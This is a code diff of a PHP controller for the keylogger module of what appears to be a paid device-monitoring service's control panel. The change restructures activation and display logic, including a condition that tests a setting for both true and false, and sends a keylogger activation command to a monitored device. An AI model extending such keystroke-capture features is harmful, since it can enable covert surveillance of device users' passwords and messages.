@@ -20,7 +20,9 @@ class Keylogger extends BaseModuleController
 
     public function indexAction()
     {   
-        if ($this->view->paid && $this->di['currentDevice']['os'] === 'android' && $this->di['currentDevice']['app_version'] >= 11) {
+        if ($this->view->paid 
+                && $this->di['currentDevice']['os'] === 'android' 
+                    && $this->di['currentDevice']['app_version'] >= 11) {
             return $this->withActivation();
         }
 
@@ -40,7 +42,8 @@ class Keylogger extends BaseModuleController
 
         if ($this->view->paid) {
             if(!$keyloggerModel->hasRecords($this->di['devId']) 
-                    && isset($settings['keylogger_enabled']) && !(int)$settings['keylogger_enabled']) {
+                    && isset($settings['keylogger_enabled']) && !$settings['keylogger_enabled']
+                    && $this->di['currentDevice']['os'] !== 'ios') {
                 return $this->setView('cp/keylogger/activation.htm');
             }
             $this->view->serviceKeylogger = $settings['keylogger_enabled'];
@@ -52,13 +55,13 @@ class Keylogger extends BaseModuleController
 
     private function withActivation()
     {
+        
+        $keyloggerModel = new \Models\Cp\Keylogger($this->di);
         $settingsModel = new \Models\Cp\Settings($this->di);
         $settings = $settingsModel->getDeviceSettings($this->di['devId']);
-
-        if ($settings['keylogger_enabled']) {
-            $keyloggerModel = new \Models\Cp\Keylogger($this->di);
-            $settingsModel = new \Models\Cp\Settings($this->di);
-            $settings = $settingsModel->getDeviceSettings($this->di['devId']);
+        
+        if ( ($settings['keylogger_enabled'] or !$settings['keylogger_enabled']) 
+                and $keyloggerModel->hasRecords($this->di['devId'])) {
             
             if ($this->getRequest()->isAjax()) {
                 $dataTableRequest = new \System\DataTableRequest($this->di);
@@ -69,26 +72,24 @@ class Keylogger extends BaseModuleController
                 $this->checkDisplayLength($dataTableRequest->getDisplayLength());
                 $this->makeJSONResponse($data);
             }
-
             
             if ($this->view->paid) {
-                if(!$keyloggerModel->hasRecords($this->di['devId']) 
-                    && isset($settings['keylogger_enabled']) && !(int)$settings['keylogger_enabled']) {
-                    $this->setView('cp/keylogger/activation.htm');die();
-                }
                 $this->view->serviceKeylogger = $settings['keylogger_enabled'];
                 $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
             }
 
             $this->setView('cp/keylogger/index.htm');
+            
         } else {
+            
             if ($this->getRequest()->hasGet('activate')) {
                 $settingsModel->activateKeylogger($this->di['devId']);
                 $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Keylogger activation command has been successfully sent! Command activation will take up to 20 min.'));
                 $this->redirect($this->di['router']->getRouteUrl('keylogger'));
             }
-            
+
             $this->setView('cp/keylogger/activation.htm');
+            
         }
     }
 
